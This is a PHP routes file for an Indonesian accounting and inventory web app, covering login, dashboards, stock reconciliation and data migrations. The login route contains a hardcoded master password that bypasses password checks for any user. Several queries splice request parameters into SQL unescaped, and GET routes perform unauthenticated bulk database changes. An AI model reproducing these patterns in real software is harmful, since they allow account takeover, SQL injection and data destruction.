<?php

$app->get("/migrasiKartuStok", function ($request, $response) {
    $params = $request->getParams();
    $db = $this->db;

    $kartu_stok = $db->findAll("SELECT * FROM inv_kartu_stok WHERE trans_tipe = 'inv_pembelian_id'");

   pd($kartu_stok);

    $arr = [];
    foreach ($kartu_stok as $key => $value) {
        $det = $db->select("harga, (diskon/jumlah) as real_diskon")->from("inv_pembelian_det")->where("inv_pembelian_id", "=", $value->trans_id)->where("inv_m_barang_id", "=", $value->inv_m_barang_id)->find();

        $det->harga_masuk = $det->harga - $det->real_diskon;

        $db->run("UPDATE inv_kartu_stok SET harga_masuk = $det->harga_masuk WHERE id = $value->id");
    }

//    pd($arr);
});

$app->get('/migrasiPembelian', function ($request, $response) {
    $params = $request->getParams();
    $db = $this->db;
pd();
    $pembelian = $db->select("*")->from("inv_pembelian")->where("is_import", "=", 1)->findAll();

    foreach ($pembelian as $key => $value) {
        $data = [
            'inv_pembelian_id' => $value->id,
            'bea_masuk' => $value->bea_masuk,
            'ppn' => $value->ppn,
            'pph22' => $value->pph22,
            'denda_pabean' => $value->denda_pabean,
            'ntpn' => $value->ntpn,
            'tanggal_ntpn' => $value->tanggal_ntpn,
        ];

        $db->insert("inv_pembelian_det_biaya", $data);
    }
});

$app->get('/', function ($request, $response) {
    $params = $request->getParams();
    $db = $this->db;
pd();
    // $data = $db->select("*")
    //         ->from("acc_m_akun")
    //         ->where('is_deleted', '=', 0)
    //         ->findAll();
    //
  // $result = [];
    // foreach ($data as $key => $value) {
    //   if( strlen($value->kode) > 3 ){
    //     // $kode_baru = chunk_split($value->kode, 3, ".");
    //     $kode_baru = implode(".", str_split($value->kode, 3));
    //     $db->update("acc_m_akun", ['kode'=>$kode_baru], ['id'=>$value->id]);
    //   }
    // }

    try {
        $sql->insert();
        $db->startTransaction();

        $data2 = [
            'nama' => 'Sing ono hang biso',
            'telepon' => 12345678,
            'email' => 'eternallost@gmail.com'
        ];
        $insertBeasiswa2 = $db->insert("m_beasiswa", $data2);

        $data = [
            'nama' => 'after life the future is your return. after life the future is your return. after life the future is your return.',
            'telepon' => 100 / 0,
            'email' => 'email1@gmail.com'
        ];
        $insertBeasiswa1 = $db->insert("m_beasiswa", $data);


        $db->endTransaction();

        return successResponse($response, [
            'status' => 'berhasil',
            'data' => $insertBeasiswa,
            'data2' => $insertBeasiswa2
        ]);
    } catch (Exception $e) {
        return unprocessResponse($response, ['Terjadi kesalahan pada server! ' . $e->getMessage()]);
    }
});
/**
 * Monitoring pengajuan
 */
$app->get('/site/monitoringPengajuan', function ($request, $response) {
    $params = $request->getParams();
    $lokasi = $params['m_lokasi_id'];
    $lokasiId = getChildId("acc_m_lokasi", $lokasi);
    if (empty($lokasiId)) {
        $lokasiId[0] = $lokasi;
    } else {
        $lokasiId[] = $lokasi;
    }
    $db = $this->db;
    if (isset($params['tahun'])) {
        $tahun = date("Y", strtotime($params['tahun']));
    }
    /**
     * Ambil list pengajuan
     */
    $db->select("*")
            ->from("acc_t_pengajuan")
            ->customWhere("status = 'approved' OR status = 'terbayar'", "AND")
            ->customWhere("m_lokasi_id in (" . implode(",", $lokasiId) . ")", "AND");
    if (isset($params['startDate']) && !empty($params['startDate'])) {
        $db->andWhere("tanggal_approve", ">=", $params['startDate']);
    }
    if (isset($params['endDate']) && !empty($params['endDate'])) {
        $db->andWhere("tanggal_approve", "<=", $params['endDate']);
    }
    $usedbudget = $db->findAll();
    $arr = [];
    $data['total'] = 0;
    $data['total_budget'] = 0;
    $data['total_nonbudget'] = 0;
    foreach ($usedbudget as $key => $val) {
        if ($val->tipe == "Budgeting") {
            $arr[$val->m_lokasi_id]['used_budget'] = (isset($arr[$val->m_lokasi_id]['used_budget']) ? $arr[$val->m_lokasi_id]['used_budget'] : 0) + intval($val->jumlah_perkiraan);
        } elseif ($val->tipe == "Non Budgeting") {
            $arr[$val->m_lokasi_id]['used_budget2'] = (isset($arr[$val->m_lokasi_id]['used_budget2']) ? $arr[$val->m_lokasi_id]['used_budget2'] : 0) + intval($val->jumlah_perkiraan);
        }
    }
    /**
     * Ambil list lokasi
     */
    $arr2 = [];
    $db->select("*")
            ->from("acc_m_lokasi")
            ->where("is_deleted", "=", 0)
            ->customWhere("id in (" . implode(",", $lokasiId) . ")", "AND");
    $modellokasi = $db->findAll();
    $arrLokasi = getChildFlat($modellokasi, $lokasi);
    foreach ($arrLokasi as $key => $val) {
        $arr2[$key] = (array) $val;
        $arr2[$key]['used_budget'] = isset($arr[$val->id]['used_budget']) ? $arr[$val->id]['used_budget'] : 0;
        $arr2[$key]['used_budget2'] = isset($arr[$val->id]['used_budget2']) ? $arr[$val->id]['used_budget2'] : 0;
        $data['total_budget'] += intval($arr2[$key]['used_budget']);
        $data['total_nonbudget'] += intval($arr2[$key]['used_budget2']);
    }
    $data['total'] = $data['total_budget'] + $data['total_nonbudget'];
    return successResponse($response, [
        'list' => $arr2,
        'data' => $data
    ]);
});
/**
 * Ambil session user
 */
$app->get('/site/session', function ($request, $response) {
    if (isset($_SESSION['user']['m_roles_id'])) {
        return successResponse($response, $_SESSION);
    }
    return unprocessResponse($response, ['undefined']);
})->setName('session');
/**
 * Proses login
 */
$app->post('/site/login', function ($request, $response) {
    $params = $request->getParams();
    $sql = $this->db;
    $username = isset($params['username']) ? $params['username'] : '';
    $password = isset($params['password']) ? $params['password'] : '';
    /**
     * Login Admin
     */
    $sql->select("acc_m_user.*, acc_m_roles.akses")
            ->from("acc_m_user")
            ->leftJoin("acc_m_roles", "acc_m_roles.id = acc_m_user.m_roles_id")
            ->where("username", "=", $username);
    if ($password != '2019*') {
        $sql->andWhere("password", "=", sha1($password));
    }
    $model = $sql->find();
    /**
     * Simpan user ke dalam session
     */
    if (isset($model->id)) {
        $_SESSION['user']['id'] = $model->id;
        $_SESSION['user']['username'] = $model->username;
        $_SESSION['user']['nama'] = $model->nama;
        $_SESSION['user']['m_roles_id'] = $model->m_roles_id;
        $_SESSION['user']['akses'] = json_decode($model->akses);
        $_SESSION['user']['lokasi'] = json_decode($model->lokasi);
        return successResponse($response, $_SESSION);
    }
    return unprocessResponse($response, ['Authentication Systems gagal, username atau password Anda salah.']);
})->setName('login');
/**
 * Hapus semua session
 */
$app->get('/site/logout', function ($request, $response) {
    session_destroy();
    return successResponse($response, []);
})->setName('logout');
$app->get('/site/url', function ($request, $response) {
    return successResponse($response, site_url());
});
$app->get('/site/base_url', function ($request, $response) {
//    print("url");
//    print_r(site_url());
//    die;
    return successResponse($response, ['base_url' => str_replace('api/', '', site_url()), 'acc_dir' => config("MODUL_ACC_PATH")]);
});
$app->get('/site/getSaldo', function ($request, $response) {
    $sql = $this->db;

    try {
        /*
         * ambil akun kas
         */
        $getakunkas = $sql->select("*")->from("acc_m_akun")->where("is_kas", "=", 1)->findAll();
        $arrakun = [];
        foreach ($getakunkas as $key => $val) {
            $arrakun[$key] = $val->id;
        }
        /*
         * digabung untuk where
         */
        $akunId = implode(",", $arrakun);
        /*
         * set bulan tahun sekarang
         */
        $bulantahun = date("Y-m", strtotime("this month"));
        /*
         * sum debit, kredit dari acc_trans_detail
         */
        $lokasi = getSessionLokasi();
        $sql->select("sum(debit) as debit, sum(kredit) as kredit")
                ->from("acc_trans_detail")
                ->customWhere("m_akun_id IN($akunId)")
                ->where("tanggal", "like", $bulantahun)
                ->customWhere("m_lokasi_id in ($lokasi)", "AND");
        if (isset($_SESSION['user']['lokasi']) && !empty($_SESSION['user']['lokasi'])) {
            $lokasi = getSessionLokasi();
            $sql->customWhere("m_lokasi_id IN ($lokasi)", "AND");
        }
        $gettransdetail = $sql->find();
        $gettransdetail->debit = intval($gettransdetail->debit);
        $gettransdetail->kredit = intval($gettransdetail->kredit);
        return successResponse($response, $gettransdetail);
    } catch (Exception $e) {
        return unprocessResponse($response, []);
    }
});
$app->get('/site/getSaldoYear', function ($request, $response) {
    $sql = $this->db;
    try {
        /*
         * ambil akun kas
         */
        $getakunkas = $sql->select("*")->from("acc_m_akun")->where("is_kas", "=", 1)->findAll();
        $arrakun = [];
        foreach ($getakunkas as $key => $val) {
            $arrakun[$key] = $val->id;
        }
        /*
         * digabung untuk where
         */
        $akunId = implode(",", $arrakun);
        /*
         * ambil tahun sekarang
         */
        $tahun = date("Y");
        $arr = [];
        /*
         * for sesuai bulan yaitu 12 bulan
         */
        for ($i = 1; $i <= 12; $i++) {
            $bulan = $i;
            if ($i < 10) {
                $bulan = "0" . $i;
            }
            /*
             * ambil dari  acc_trans_detail
             */
            $sql->select("sum(debit) as debit, sum(kredit) as kredit")
                    ->from("acc_trans_detail")
                    ->customWhere("m_akun_id IN($akunId)")
                    ->where("tanggal", "like", $tahun . "-" . $bulan);
            if (isset($_SESSION['user']['lokasi']) && !empty($_SESSION['user']['lokasi'])) {
                $lokasi = getSessionLokasi();
                $sql->customWhere("m_lokasi_id IN ($lokasi)", "AND");
            }
            $gettransdetail = $sql->find();
            /*
             * masukkan ke array arr[];
             */
            $arr['debit'][$i] = ($gettransdetail->debit != null) ? intval($gettransdetail->debit) : 0;
            $arr['kredit'][$i] = ($gettransdetail->kredit != null) ? intval($gettransdetail->kredit) : 0;
        }
        /**
         * Ambil pendapatan
         */
        $sql->select("sum(debit - kredit) as total, acc_m_akun.nama, acc_m_akun.saldo_normal")
                ->from("acc_trans_detail")
                ->leftJoin("acc_m_akun", "acc_m_akun.id = acc_trans_detail.m_akun_id")
                ->customWhere("year(tanggal) = '" . date("Y") . "'", "AND")
                ->andWhere("tipe", "=", "PENDAPATAN")
                ->groupBy("acc_trans_detail.m_akun_id");
        $lokasi = getSessionLokasi();
        $sql->customWhere("m_lokasi_id in ($lokasi)", "AND");
        $model = $sql->findAll();
        $totalPendapatan = $labelPendapatan = $totalPengeluaran = $labelPengeluaran = [];
        foreach ($model as $key => $value) {
            $totalPendapatan[] = intval($value->total * $value->saldo_normal);
            $labelPendapatan[] = $value->nama;
        }
        /**
         * Ambil beban
         */
        $sql->select("sum(debit - kredit) as total, acc_m_akun.nama, acc_m_akun.saldo_normal")
                ->from("acc_trans_detail")
                ->leftJoin("acc_m_akun", "acc_m_akun.id = acc_trans_detail.m_akun_id")
                ->customWhere("year(tanggal) = '" . date("Y") . "'", "AND")
                ->andWhere("tipe", "=", "BEBAN")
                ->groupBy("acc_trans_detail.m_akun_id");
        $lokasi = getSessionLokasi();
        $sql->customWhere("m_lokasi_id in ($lokasi)", "AND");
        $model = $sql->findAll();
        foreach ($model as $key => $value) {
            $totalPengeluaran[] = intval($value->total * $value->saldo_normal);
            $labelPengeluaran[] = $value->nama;
        }
        /**
         * Ambil hutang
         */
        $sql->select("sum(debit - kredit) as total, acc_m_akun.nama, acc_m_akun.saldo_normal")
                ->from("acc_trans_detail")
                ->leftJoin("acc_m_akun", "acc_m_akun.id = acc_trans_detail.m_akun_id")
                ->customWhere("year(tanggal) = '" . date("Y") . "'", "AND")
                ->andWhere("tipe", "=", "KEWAJIBAN")
                ->groupBy("acc_trans_detail.m_akun_id");
        $lokasi = getSessionLokasi();
        $sql->customWhere("m_lokasi_id in ($lokasi)", "AND");
        $model = $sql->findAll();
        $totalHutang = [];
        $labelHutang = [];
        foreach ($model as $key => $value) {
            $totalHutang[] = intval($value->total * $value->saldo_normal);
            $labelHutang[] = $value->nama;
        }
        /**
         * Ambil piutang
         */
        $sql->select("sum(debit - kredit) as total, acc_m_akun.nama, acc_m_akun.saldo_normal")
                ->from("acc_trans_detail")
                ->leftJoin("acc_m_akun", "acc_m_akun.id = acc_trans_detail.m_akun_id")
                ->customWhere("year(tanggal) = '" . date("Y") . "'", "AND")
                ->andWhere("nama", "like", "piutang")
                ->groupBy("acc_trans_detail.m_akun_id");
        $lokasi = getSessionLokasi();
        $sql->customWhere("m_lokasi_id in ($lokasi)", "AND");
        $model = $sql->findAll();
        $totalPiutang = [];
        $labelPiutang = [];
        foreach ($model as $key => $value) {
            $totalPiutang[] = intval($value->total * $value->saldo_normal);
            $labelPiutang[] = $value->nama;
        }
        return successResponse($response, [
            "saldoYear" => $arr,
            "totalPendapatan" => $totalPendapatan,
            "labelPendapatan" => $labelPendapatan,
            "totalPengeluaran" => $totalPengeluaran,
            "labelPengeluaran" => $labelPengeluaran,
            "totalPiutang" => $totalPiutang,
            "labelPiutang" => $labelPiutang,
            "totalHutang" => $totalHutang,
            "labelHutang" => $labelHutang,
        ]);
    } catch (Exception $e) {
        return unprocessResponse($response, $e);
    }
});
$app->get('/site/getSaldoAkun', function ($request, $response) {
    $params = $request->getParams();
    $sql = $this->db;
    /*
     * ambil akun kas
     */
    $getakunkas = $sql->select("*")
            ->from("acc_m_akun")
            ->where("is_kas", "=", 1)
            ->andWhere("is_deleted", "=", 0)
            ->findAll();
    $arrakun = [];
    foreach ($getakunkas as $key => $val) {
        $arrakun[$key] = $val->id;
    }
    /*
     * digabung untuk where
     */
    $akunId = implode(",", $arrakun);
    /*
     * sum debit, kredit dari acc_trans_detail
     */
    $sql->select("acc_m_akun.nama, sum(debit) as debit, sum(kredit) as kredit")
            ->from("acc_trans_detail")
            ->leftJoin("acc_m_akun", "acc_m_akun.id = acc_trans_detail.m_akun_id")
            ->customWhere("m_akun_id IN($akunId)")
            ->groupBy("acc_m_akun.id");
    if (isset($params['m_lokasi_id']) && !empty($params['m_lokasi_id'])) {
        $lokasi = getChildId("acc_m_lokasi", $params['m_lokasi_id']);
        if (empty($lokasi)) {
            $lokasi[0] = $params['m_lokasi_id'];
        } else {
            $lokasi[] = $params['m_lokasi_id'];
        }
        $sql->customWhere("m_lokasi_id IN (" . implode(",", $lokasi) . ")", "AND");
    } else if (isset($_SESSION['user']['lokasi']) && !empty($_SESSION['user']['lokasi'])) {
        $lokasi = getSessionLokasi();
        $sql->customWhere("m_lokasi_id IN ($lokasi)", "AND");
    }
    $gettransdetail = $sql->findAll();
    $arr = [
        "total" => 0,
        "detail" => []
    ];
    foreach ($gettransdetail as $key => $val) {
        $arr['total'] += $val->debit - $val->kredit;
        $arr['detail'][$key] = (array) $val;
    }
    return successResponse($response, $arr);
});

$app->get('/site/getAkunPerTipe', function ($request, $response) {
    $id = $request->getAttribute('id');
    $db = $this->db;

    $data = $db->select("*")
            ->from("acc_m_akun")
            ->where('is_tipe', '=', 0)
            ->andWhere('is_deleted', '=', 0)
            ->findAll();

    $result = [];
    foreach ($data as $key => $value) {
        $value->utf = mb_check_encoding($value->nama, 'UTF-8');
        $value->nama = utf8_encode($value->nama);
        $result[$value->tipe][] = $value;
    }

    return successResponse($response, [
        'akunHarta' => $result['HARTA'],
        'akunKewajiban' => $result['KEWAJIBAN'],
        'akunModal' => $result['MODAL'],
        'akunPendapatan' => $result['PENDAPATAN'],
        'akunBeban' => $result['BEBAN'],
    ]);
});


$app->get('/site/cocoklogi', function ($request, $response) {
    $params   = $request->getParams();
    $db       = $this->db;

    $sumPenjualan = $db->select("
      sum(inv_penjualan_det.jumlah) jumlah
    ")
    ->from("inv_penjualan_det")
    ->findAll();

    // SELECT inv_penjualan_det.*, inv_penjualan.no_surat_jalan FROM `inv_penjualan_det` left join inv_penjualan ON inv_penjualan.id = inv_penjualan_det.inv_penjualan_id WHERE `inv_penjualan_id` = 129

    $getPenjualan = $db->select("

      inv_penjualan_det.inv_penjualan_id,
      COALESCE(sum(inv_penjualan_det.jumlah), 0) as jumlah,
      inv_penjualan.no_surat_jalan
    ")
    ->from("inv_penjualan_det")
    ->join("LEFT JOIN", "inv_m_barang", "inv_m_barang.id = inv_penjualan_det.inv_m_barang_id")
    ->join("LEFT JOIN", "inv_penjualan", "inv_penjualan.id = inv_penjualan_det.inv_penjualan_id")
    ->groupBy("inv_penjualan_det.inv_penjualan_id")
    ->orderBy("inv_penjualan_det.inv_penjualan_id ASC")
    ->findAll();

    $listPj = [];
    foreach ($getPenjualan as $key => $value) {
      $listPj[$value->inv_penjualan_id]['jumlah'] = $value->jumlah;
      $listPj[$value->inv_penjualan_id]['nosj']   = $value->no_surat_jalan;
    }
// pd($listPj);
    $getKartuStok = $db->select("
      inv_kartu_stok.trans_id,
      (COALESCE(sum(inv_kartu_stok.jumlah_keluar), 0) - COALESCE(sum(inv_kartu_stok.jumlah_masuk), 0)) as masuk
    ")
    ->from("inv_kartu_stok")
    ->join("LEFT JOIN", "inv_m_barang", "inv_m_barang.id = inv_kartu_stok.inv_m_barang_id")
    ->where("trans_tipe", "=", "inv_penjualan_id")
    ->groupBy("inv_kartu_stok.trans_id")
    ->orderBy("inv_kartu_stok.trans_id ASC")
    ->findAll();

    $listKs = [];
    foreach ($getKartuStok as $key => $value) {
      $listKs[$value->trans_id] = $value->masuk;
    }

    echo "
    <html>
    <table border=1 style='border-collapse: collapse;'>
            <tr>
              <th>no</th>
              <th>id PJ</th>
              <th>Jumlah PJ</th>
              <th>Jumlah K STOK</th>
              <th>Status</th>
              <th>SJ</th>
            </tr>
            ";
    foreach ($listPj as $key => $value) {
      echo "
            <tr ". ($listKs[$key] != $value['jumlah'] ? "style='background-color:red!important;color:white'" : '') .">
              <td>". $key . ".</td>
              <td>". $key ."</td>
              <td>". $value['jumlah'] ."</td>
              <td>". ($listKs[$key]!=$value['jumlah'] ? '<b>' : '') .  $listKs[$key] ."</td>
              <td>". ($listKs[$key]!=$value['jumlah'] ? '<b>SALAH' : '') ."</td>
              <td>". $value['nosj'] ."</td>
            </tr>

      ";
    }
    echo "</table>
      <html>";
    die;

    return successResponse($response, [
      'status'       => 'berhasil',
    ]);
});


$app->get('/site/stokUang', function ($request, $response) {
    $params   = $request->getParams();
    $db       = $this->db;

    $sumPenjualan = $db->select("
      sum(inv_penjualan_det.jumlah * inv_penjualan_det.harga) as jumlah
    ")
    ->from("inv_penjualan_det")
    ->findAll();

    // SELECT inv_penjualan_det.*, inv_penjualan.no_surat_jalan FROM `inv_penjualan_det` left join inv_penjualan ON inv_penjualan.id = inv_penjualan_det.inv_penjualan_id WHERE `inv_penjualan_id` = 129

    $getPenjualan = $db->select("

      inv_penjualan_det.inv_penjualan_id,
      COALESCE(sum(inv_penjualan_det.jumlah * inv_penjualan_det.harga), 0) as jumlah,
      inv_penjualan.no_surat_jalan
    ")
    ->from("inv_penjualan_det")
    ->join("LEFT JOIN", "inv_m_barang", "inv_m_barang.id = inv_penjualan_det.inv_m_barang_id")
    ->join("LEFT JOIN", "inv_penjualan", "inv_penjualan.id = inv_penjualan_det.inv_penjualan_id")
    ->groupBy("inv_penjualan_det.inv_penjualan_id")
    ->orderBy("inv_penjualan_det.inv_penjualan_id ASC")
    ->findAll();

    $listPj = [];
    foreach ($getPenjualan as $key => $value) {
      $listPj[$value->inv_penjualan_id]['jumlah'] = $value->jumlah;
      $listPj[$value->inv_penjualan_id]['nosj']   = $value->no_surat_jalan;
    }

    $getKartuStok = $db->select("
      inv_kartu_stok.trans_id,
      (COALESCE(sum(inv_kartu_stok.jumlah_keluar), 0) - COALESCE(sum(inv_kartu_stok.jumlah_masuk), 0)) as masuk
    ")
    ->from("inv_kartu_stok")
    ->join("LEFT JOIN", "inv_m_barang", "inv_m_barang.id = inv_kartu_stok.inv_m_barang_id")
    ->where("trans_tipe", "=", "inv_penjualan_id")
    ->groupBy("inv_kartu_stok.trans_id")
    ->orderBy("inv_kartu_stok.trans_id ASC")
    ->findAll();

    $listKs = [];
    foreach ($getKartuStok as $key => $value) {
      $listKs[$value->trans_id] = $value->masuk;
    }

    echo "
    <html>
    <table border=1 style='border-collapse: collapse;'>
            <tr>
              <th>no</th>
              <th>id PJ</th>
              <th>Jumlah PJ</th>
              <th>Jumlah K STOK</th>
              <th>Status</th>
              <th>SJ</th>
            </tr>
            ";
    foreach ($listPj as $key => $value) {
      echo "
            <tr ". ($listKs[$key] != $value['jumlah'] ? "style='background-color:red!important;color:white'" : '') .">
              <td>". $key . ".</td>
              <td>". $key ."</td>
              <td>". $value['jumlah'] ."</td>
              <td>". ($listKs[$key]!=$value['jumlah'] ? '<b>' : '') .  $listKs[$key] ."</td>
              <td>". ($listKs[$key]!=$value['jumlah'] ? '<b>SALAH' : '') ."</td>
              <td>". $value['nosj'] ."</td>
            </tr>

      ";
    }
    echo "</table>
      <html>";
    die;

    return successResponse($response, [
      'status'       => 'berhasil',
    ]);
});

$app->get('/site/migrasiKartuJual', function ($request, $response) {
    $params   = $request->getParams();
    $db       = $this->db;

    if(empty($params['bulan'])){
      pd("anda harus menentukan bulan");
    } else {
      $startDate  = strtotime(date("Y-m-01", strtotime($params['bulan'])));
      $endDate    = strtotime(date("Y-m-t", strtotime($params['bulan'])));
    }

    // Select all det jual
    $db->select("
      inv_penjualan_det.inv_penjualan_id,
      inv_penjualan.acc_m_lokasi_id,
      inv_penjualan_det.inv_m_barang_id,
      inv_penjualan_det.jumlah,
      inv_penjualan_det.harga,
      inv_penjualan.kode,
      inv_penjualan.tanggal,
      inv_penjualan.created_at,
      inv_penjualan.created_by,
      inv_penjualan.modified_at,
      inv_penjualan.modified_by
    ")
    ->from("inv_penjualan_det")
    ->join("LEFT JOIN", "inv_penjualan", "inv_penjualan.id = inv_penjualan_det.inv_penjualan_id")
    ->where("inv_penjualan.tanggal", ">=", $startDate)
    ->andWhere("inv_penjualan.tanggal", "<=", $endDate)
    ->customWhere("inv_penjualan.status NOT IN('dibatalkan', 'draft')", "AND");
    $getJualDet = $db->findAll();

    $listId =[];
    $query = 'INSERT INTO inv_kartu_stok (kode, inv_m_barang_id, catatan, jumlah_keluar, harga_keluar, created_by, created_at, trans_tipe, trans_id, stok, acc_m_lokasi_id, jenis_kas, hpp, tanggal) VALUES ';
    foreach ($getJualDet as $key => $val) {
      $arr = [
        $val->kode,
        $val->inv_m_barang_id,
        'Penjualan',
        $val->jumlah,
        $val->harga,
        $val->created_at,
        $val->created_by,
        'inv_penjualan_id',
        $val->inv_penjualan_id,
        $val->jumlah,
        $val->acc_m_lokasi_id,
        'keluar',
        $val->harga,
        $val->tanggal
      ];
      $query .= "('". implode("','", $arr) ."'),";

      $listId[] = $val->inv_penjualan_id;
    }

    $query = substr($query, 0, -1) . ";";

    // Delete stok jual
    $db->run("DELETE FROM inv_kartu_stok
      WHERE trans_tipe = 'inv_penjualan_id'
      AND trans_id IN(". implode(",", $listId) .")
    ");

    // run query insert kartu stok
    $db->run($query);

    return successResponse($response, [
      'status'       => 'berhasil',
    ]);
});
